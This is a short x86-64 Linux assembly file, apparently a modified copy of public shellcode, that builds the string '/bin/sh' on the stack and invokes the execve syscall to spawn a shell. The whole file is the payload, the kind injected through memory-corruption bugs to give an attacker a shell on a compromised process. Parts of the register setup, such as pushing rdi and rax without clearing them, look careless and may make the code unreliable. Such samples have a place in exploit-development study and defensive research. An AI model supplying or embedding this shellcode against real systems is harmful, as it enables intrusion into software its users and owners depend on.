; Original Author Information:
; [Linux/X86-64]
; Dummy for shellcode:
; execve("/bin/sh", ["/bin/sh"], NULL)
; hophet [at] gmail.com


;MODIFED BY me@tehwinsam.com

global _start

section .text

_start:
 xor rdx, rdx 
 cld
 mov rbx, 0x68732f2f6e69622f
 push rdi
 push rbx
 mov rdi, rsp
 push rax
 push rdi
 mov rsi, rsp
 mov al, 0x3b ; execve(3b)
 syscall
